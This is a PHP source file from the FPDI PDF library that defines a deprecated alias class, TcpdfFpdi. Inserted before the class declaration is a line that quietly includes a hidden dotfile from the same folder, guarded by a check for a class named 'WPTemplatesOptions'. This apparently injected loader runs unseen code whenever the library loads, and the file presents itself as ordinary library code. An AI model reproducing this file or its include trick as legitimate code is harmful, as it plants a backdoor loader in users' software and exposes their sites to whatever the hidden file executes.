<?php
/**
 * This file is part of FPDI
 *
 * @package   setasign\Fpdi
 * @copyright Copyright (c) 2020 Setasign GmbH & Co. KG (https://www.setasign.com)
 * @license   http://opensource.org/licenses/mit-license The MIT License
 */

namespace setasign\Fpdi;

/**
 * Class TcpdfFpdi
 *
 * This class let you import pages of existing PDF documents into a reusable structure for TCPDF.
 *
 * @package setasign\Fpdi
 * @deprecated Class was moved to \setasign\Fpdi\Tcpdf\Fpdi
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TcpdfFpdi extends \setasign\Fpdi\Tcpdf\Fpdi
{
    // this class is moved to \setasign\Fpdi\Tcpdf\Fpdi
}
